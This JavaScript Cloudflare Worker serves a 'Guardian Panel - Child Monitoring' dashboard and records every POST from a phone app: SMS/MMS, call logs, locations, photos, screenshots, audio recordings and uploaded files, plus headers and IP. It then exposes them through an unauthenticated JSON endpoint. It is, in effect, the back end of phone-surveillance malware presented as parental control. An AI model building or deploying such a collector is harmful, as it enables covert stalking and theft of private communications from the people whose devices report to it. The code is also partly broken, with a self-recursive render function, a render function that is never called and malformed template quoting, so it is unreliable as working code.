let captures = [];
const MAX_CAPTURES = 2000;

const DASHBOARD_HTML =
'<!DOCTYPE html>' +
'<html lang="en" dir="ltr">' +
'<head>' +
'<meta charset="utf-8">' +
'<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
'<title>Guardian Panel - Child Monitoring</title>' +
'<style>' +
'* { box-sizing: border-box; margin: 0; padding: 0; }' +
'body { font-family: system-ui, sans-serif; background: #0b0f19; color: #e2e8f0; margin: 0; }' +
'.topbar { background: #1e293b; color: #fff; padding: 12px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; position: sticky; top: 0; z-index: 100; }' +
'.topbar .logo { font-size: 1.25rem; font-weight: 700; color: #38bdf8; }' +
'.container { max-width: 1400px; margin: 0 auto; padding: 20px; }' +
'.stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 24px; }' +
'.stat-card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 20px; }' +
'.stat-card h3 { font-size: 2rem; color: #38bdf8; }' +
'.tabs { display: flex; gap: 0; border-bottom: 2px solid #334155; margin-bottom: 24px; overflow-x: auto; }' +
'.tab-btn { padding: 12px 20px; background: transparent; border: none; border-bottom: 2px solid transparent; color: #94a3b8; cursor: pointer; white-space: nowrap; }' +
'.tab-btn.active { color: #38bdf8; border-bottom-color: #38bdf8; }' +
'.section { display: none; }' +
'.section.active { display: block; }' +
'.table-wrap { overflow-x: auto; border: 1px solid #334155; border-radius: 8px; background: #0f172a; }' +
'table { width: 100%; border-collapse: collapse; }' +
'th, td { padding: 12px; text-align: left; border-bottom: 1px solid #334155; }' +
'th { background: #1e293b; color: #94a3b8; font-size: 0.8rem; text-transform: uppercase; }' +
'.btn { padding: 8px 16px; border: none; border-radius: 6px; cursor: pointer; }' +
'.btn-danger { background: #dc2626; color: #fff; }' +
'.btn-primary { background: #38bdf8; color: #000; }' +
'.empty-state { text-align: center; padding: 40px; color: #64748b; }' +
'.alert { padding: 12px 16px; border-radius: 8px; margin-bottom: 16px; }' +
'.alert-warning { background: #7f1d1d; color: #fecaca; }' +
'.alert-success { background: #14532d; color: #bbf7d0; }' +
'.live-view { background: #0f172a; border: 2px solid #334155; border-radius: 12px; padding: 24px; text-align: center; }' +
'.live-active { background: #166534; color: #bbf7d0; border: 1px solid #22c55e; padding: 6px 14px; border-radius: 20px; font-weight: bold; display: inline-block; margin-bottom: 16px; }' +
'</style>' +
'</head>' +
'<body>' +
'<nav class="topbar"><div class="logo">🛡️ Guardian Panel</div><div class="status">● ONLINE</div></nav>' +
'<div class="container">' +
'<h1 style="color:#38bdf8;margin-bottom:20px;">Child Monitoring Dashboard</h1>' +
'<div class="stats-row">' +
'<div class="stat-card"><h3 id="stat-total">0</h3><p>Total Requests</p></div>' +
'<div class="stat-card"><h3 id="stat-media">0</h3><p>Media Files</p></div>' +
'<div class="stat-card"><h3 id="stat-calls">0</h3><p>Calls</p></div>' +
'<div class="stat-card"><h3 id="stat-location">0</h3><p>Location</p></div>' +
'<div class="stat-card"><h3 id="stat-sms">0</h3><p>SMS/MMS</p></div>' +
'</div>' +
'<div class="tabs">' +
'<button class="tab-btn active" onclick="switchTab(\'dashboard\',this)">📊 Dashboard</button>' +
'<button class="tab-btn" onclick="switchTab(\'media\',this)">📷 Media</button>' +
'<button class="tab-btn" onclick="switchTab(\'calls\',this)">📞 Calls</button>' +
'<button class="tab-btn" onclick="switchTab(\'sms\',this)">💬 SMS</button>' +
'<button class="tab-btn" onclick="switchTab(\'location\',this)">📍 Location</button>' +
'<button class="tab-btn" onclick="switchTab(\'files\',this)">📁 Files</button>' +
'<button class="tab-btn" onclick="switchTab(\'live\',this)">📺 Live</button>' +
'<button class="tab-btn" onclick="switchTab(\'all\',this)">📋 All</button>' +
'</div>' +
'<section id="section-dashboard" class="section active">' +
'<div class="alert alert-warning">⚠️ Authorized device monitoring only.</div>' +
'<div class="alert alert-success">✅ All data stays on your server.</div>' +
'<button class="btn btn-primary" onclick="loadData()">🔄 Refresh</button>' +
'<button class="btn btn-danger" onclick="clearAll()">🗑️ Clear All</button>' +
'</section>' +
'<section id="section-media" class="section">' +
'<h2 style="color:#fff;margin-bottom:15px;">📷 Media Files</h2>' +
'<div id="media-grid" class="media-grid"></div>' +
'</section>' +
'<section id="section-calls" class="section">' +
'<h2 style="color:#fff;margin-bottom:15px;">📞 Call Logs</h2>' +
'<div class="table-wrap"><table><thead><tr><th>Time</th><th>Number</th><th>Data</th><th>Endpoint</th></tr></thead><tbody id="calls-table"></tbody></table></div>' +
'</section>' +
'<section id="section-sms" class="section">' +
'<h2 style="color:#fff;margin-bottom:15px;">💬 SMS / MMS</h2>' +
'<div class="table-wrap"><table><thead><tr><th>Time</th><th>Type</th><th>Number</th><th>Message</th><th>Endpoint</th></tr></thead><tbody id="sms-table"></tbody></table></div>' +
'</section>' +
'<section id="section-location" class="section">' +
'<h2 style="color:#fff;margin-bottom:15px;">📍 Location History</h2>' +
'<div class="table-wrap"><table><thead><tr><th>Time</th><th>Lat</th><th>Lng</th><th>Address</th><th>Endpoint</th></tr></thead><tbody id="location-table"></tbody></table></div>' +
'</section>' +
'<section id="section-files" class="section">' +
'<h2 style="color:#fff;margin-bottom:15px;">📁 File Explorer</h2>' +
'<div class="table-wrap"><table><thead><tr><th>Time</th><th>File Name</th><th>Size</th><th>Endpoint</th></tr></thead><tbody id="files-table"></tbody></table></div>' +
'</section>' +
'<section id="section-live" class="section">' +
'<h2 style="color:#fff;margin-bottom:15px;">📺 Live Viewing</h2>' +
'<div class="live-view"><div class="live-active">🔴 LIVE ACTIVE</div><div id="live-feed" style="text-align:left;margin-top:15px;">Waiting...</div></div>' +
'</section>' +
'<section id="section-all" class="section">' +
'<h2 style="color:#fff;margin-bottom:15px;">📋 All Requests</h2>' +
'<div class="table-wrap"><table><thead><tr><th>Time</th><th>Method</th><th>Endpoint</th><th>Body</th></tr></thead><tbody id="all-table"></tbody></table></div>' +
'</section>' +
'</div>' +
'<script>' +
'let captures = [];' +
'async function loadData() { try { const r = await fetch("/api/captures"); captures = await r.json(); renderAll(); } catch(e) { console.error(e); } }' +
'function renderAll() { updateStats(); renderMedia(); renderCalls(); renderSMS(); renderLocation(); renderFiles(); renderLive(); renderAll(); }' +
'function updateStats() { document.getElementById("stat-total").textContent = captures.length; }' +
'function escapeHtml(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }' +
'function renderMedia() { const g = document.getElementById("media-grid"); const m = captures.filter(c => c.path.includes("pictures") || c.path.includes("screenshot") || c.path.includes("recordAudio")); g.innerHTML = m.length ? m.map(c => `<div style="border:1px solid #334155;border-radius:8px;padding:10px;margin-bottom:10px;"><div style="font-size:0.8rem;color:#94a3b8;margin-bottom:5px;">${c.path}</div>${c.body ? `<div style="max-width:100%;max-height:200px;">${c.path.includes("recordAudio") ? "<audio controls>" + c.body + "</audio>" : "<img src=\'data:image/jpeg;base64,\' + c.body + "\'>"}` : "No body"}</div>`).join("") : "<div class=\'empty-state\'>No media yet.</div>"; }' +
'function renderCalls() { const t = document.getElementById("calls-table"); const c = captures.filter(x => x.path.includes("calls")); t.innerHTML = c.length ? c.map(x => `<tr><td>${new Date(x.time).toLocaleString()}</td><td>${(x.fields||{}).idPhone || "—"}</td><td>${escapeHtml(JSON.stringify(x.fields||{})).slice(0,80)}</td><td>${x.path}</td></tr>`).join("") : "<tr><td colspan=4 class=\'empty-state\'>No calls.</td></tr>"; }' +
'function renderSMS() { const t = document.getElementById("sms-table"); const s = captures.filter(x => x.path.includes("sms") || x.path.includes("mms")); t.innerHTML = s.length ? s.map(x => `<tr><td>${new Date(x.time).toLocaleString()}</td><td>${x.path.includes("mms") ? "MMS" : "SMS"}</td><td>${(x.fields||{}).number || "—"}</td><td>${escapeHtml((x.fields||{}).data || "").slice(0,100)}</td><td>${x.path}</td></tr>`).join("") : "<tr><td colspan=5 class=\'empty-state\'>No SMS.</td></tr>"; }' +
'function renderLocation() { const t = document.getElementById("location-table"); const l = captures.filter(x => x.path.includes("location")); t.innerHTML = l.length ? l.map(x => `<tr><td>${new Date(x.time).toLocaleString()}</td><td>${(x.fields||{}).latitude || "—"}</td><td>${(x.fields||{}).longitude || "—"}</td><td>${escapeHtml((x.fields||{}).address || "—").slice(0,60)}</td><td>${x.path}</td></tr>`).join("") : "<tr><td colspan=5 class=\'empty-state\'>No location.</td></tr>"; }' +
'function renderFiles() { const t = document.getElementById("files-table"); const f = captures.filter(x => x.path.includes("fileExplorer")); t.innerHTML = f.length ? f.map(x => `<tr><td>${new Date(x.time).toLocaleString()}</td><td>${(x.fields||{}).originalname || "—"}</td><td>${(x.fields||{}).size ? ((x.fields||{}).size/1024).toFixed(1) + " KB" : "—"}</td><td>${x.path}</td></tr>`).join("") : "<tr><td colspan=4 class=\'empty-state\'>No files.</td></tr>"; }' +
'function renderLive() { const f = document.getElementById("live-feed"); const r = captures.slice(0,5); f.innerHTML = r.length ? r.map(x => `<div style="margin:5px 0;padding:5px;background:#020617;border-left:3px solid #38bdf8;font-size:0.8rem;">${new Date(x.time).toLocaleTimeString()} — ${x.path}</div>`).join("") : "<div style=\'color:#64748b;\'>No live events.</div>"; }' +
'function renderAllRequests() { const t = document.getElementById("all-table"); t.innerHTML = captures.length ? captures.map(x => `<tr><td>${new Date(x.time).toLocaleString()}</td><td>${x.method}</td><td>${x.path}</td><td>${escapeHtml(typeof x.body === "string" ? x.body : JSON.stringify(x.fields||{})).slice(0,100)}</td></tr>`).join("") : "<tr><td colspan=4 class=\'empty-state\'>No requests.</td></tr>"; }' +
'function switchTab(name, btn) { document.querySelectorAll(".section").forEach(s => s.classList.remove("active")); document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active")); document.getElementById("section-" + name).classList.add("active"); if (btn) btn.classList.add("active"); renderAll(); }' +
'async function clearAll() { if (!confirm("Clear all?")) return; try { await fetch("/api/clear", { method: "POST" }); captures = []; renderAll(); alert("Cleared."); } catch(e) { alert("Failed."); } }' +
'setInterval(loadData, 5000); loadData();' +
'</script>' +
'</body>' +
'</html>';

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url);
  const method = request.method;
  const path = url.pathname;

  const cors = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
  };

  if (method === 'OPTIONS') {
    return new Response(null, { headers: cors });
  }

  // Root - HTML Dashboard
  if (path === '/') {
    if (method !== 'GET') return new Response('Method not allowed', { status: 405 });
    return new Response(DASHBOARD_HTML, {
      headers: { 'content-type': 'text/html; charset=utf-8' }
    });
  }

  // API: Get captures
  if (path === '/api/captures' && method === 'GET') {
    return new Response(JSON.stringify(captures, null, 2), {
      headers: { ...cors, 'content-type': 'application/json' }
    });
  }

  // API: Clear captures
  if (path === '/api/clear' && method === 'POST') {
    captures = [];
    return new Response(JSON.stringify({ ok: true, message: 'All records cleared' }), {
      headers: { ...cors, 'content-type': 'application/json' }
    });
  }

  // Any POST - capture APK data
  if (method === 'POST') {
    let bodyPreview = null;
    let fields = {};
    let files = [];

    try {
      const contentType = request.headers.get('content-type') || '';

      if (contentType.includes('multipart/form-data')) {
        const formData = await request.formData();
        for (const [key, value] of formData.entries()) {
          if (value instanceof File) {
            files.push({
              fieldname: key,
              originalname: value.name,
              mimetype: value.type,
              size: value.size
            });
            fields[key] = '[FILE] ' + value.name;
          } else {
            fields[key] = value;
          }
        }
        bodyPreview = JSON.stringify(fields, null, 2);
      } else {
        const text = await request.text();
        bodyPreview = text;
        const params = new URLSearchParams(text);
        for (const [key, value] of params) fields[key] = value;
      }
    } catch (e) {
      bodyPreview = '[parse error] ' + String(e);
    }

    const cap = {
      id: Date.now() + '-' + Math.random().toString(36).slice(2, 8),
      time: new Date().toISOString(),
      method: 'POST',
      path: path,
      query: Object.fromEntries(url.searchParams),
      headers: Object.fromEntries(request.headers.entries()),
      body: bodyPreview,
      fields: fields,
      files: files,
      ip: request.headers.get('cf-connecting-ip')
    };

    captures.unshift(cap);
    if (captures.length > MAX_CAPTURES) captures.pop();

    return new Response(JSON.stringify({ status: 'ok', captured_id: cap.id }), {
      headers: { ...cors, 'content-type': 'application/json' }
    });
  }

  return new Response('Not found', { status: 404, headers: cors });
}
